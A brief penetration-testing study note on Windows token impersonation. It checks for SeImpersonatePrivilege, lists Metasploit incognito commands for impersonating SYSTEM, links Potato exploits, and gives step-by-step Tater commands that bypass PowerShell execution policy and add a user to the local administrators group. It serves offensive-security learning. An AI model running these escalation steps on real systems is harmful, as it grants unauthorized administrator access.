Token Impersonation

# Token Impersonation
**Overview:**
Tokens are temporary keys that allow ypu to access system/network without having to provide credentials each time you access a file. Basically cookies for your computer

**Two Types:**
- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - “non interactive” such as attaching a network drive or a domain logon script

https://github.com/gtworek/Priv2Admin
```
whoami /priv 
```
Or in metasploit
```
getprivs
```
Look for:
SeImpersonatePrivilege / SeAssignPrimaryToken



**Potato Attacks:**
https://github.com/ohpe/juicy-potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/


**Metasploit:**
```
load incognito
list_tokens -u
```
Hopefully: impersonate_token “NT AUTHORITY\SYSTEM”

Exploitation:
1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
